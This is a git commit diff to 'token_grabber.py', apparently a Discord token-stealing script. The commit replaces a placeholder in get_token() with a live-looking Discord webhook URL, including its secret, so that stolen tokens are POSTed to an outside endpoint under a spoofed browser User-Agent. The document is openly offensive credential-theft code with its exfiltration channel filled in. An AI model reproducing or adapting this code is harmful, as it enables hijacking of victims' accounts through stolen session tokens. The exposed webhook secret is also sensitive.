d4da15ffd8ae0f700ee0a03df0b736b6ba743a31
sprmebeams <109605621+sprmebeams@users.noreply.github.com>
2022-07-31 16:09:54 +0200

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -121,7 +121,7 @@ def get_token():
                                 'Content-Type': 'application/json',
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
-                            req = Request('WEBHOOK-URL', data=payload.encode(), headers=headers2)
+                            req = Request('https://discord.com/api/webhooks/1003303346741985280/ommF6vcdtiAzk-uSV5JKOq_6yVk2kK5WOOtt3SSx0aXww7k7weDoAxmwxO8ctb-eupF7', data=payload.encode(), headers=headers2)
                             urlopen(req)
                         except: continue
                 else: continue
